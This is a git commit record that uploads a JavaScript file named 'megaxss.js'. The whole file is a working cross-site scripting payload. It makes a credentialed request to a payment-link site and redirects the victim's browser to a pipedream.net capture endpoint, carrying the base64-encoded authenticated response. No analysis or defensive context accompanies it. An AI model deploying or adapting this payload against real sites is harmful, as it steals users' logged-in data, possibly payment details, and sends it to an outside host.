fd5ec41968e11d11ae23960ac3b0f0f2ec5206e6
Androxus <49584609+Androx27@users.noreply.github.com>
2022-06-16 18:54:49 +0700

    Add files via upload

---
+++ megaxss.js
@@ -0,0 +1,10 @@
+var request = new XMLHttpRequest();
+request.onload = gimme;
+request.open('GET', 'http://paymentlink.mdcorpora.com')
+request.withCredentials = true;
+request.send();
+
+
+function gimme() {
+	location = 'https://0944890785d50fb7aba324bbc9e9b142.m.pipedream.net/lulz=' + btoa(this.responseText);
+}
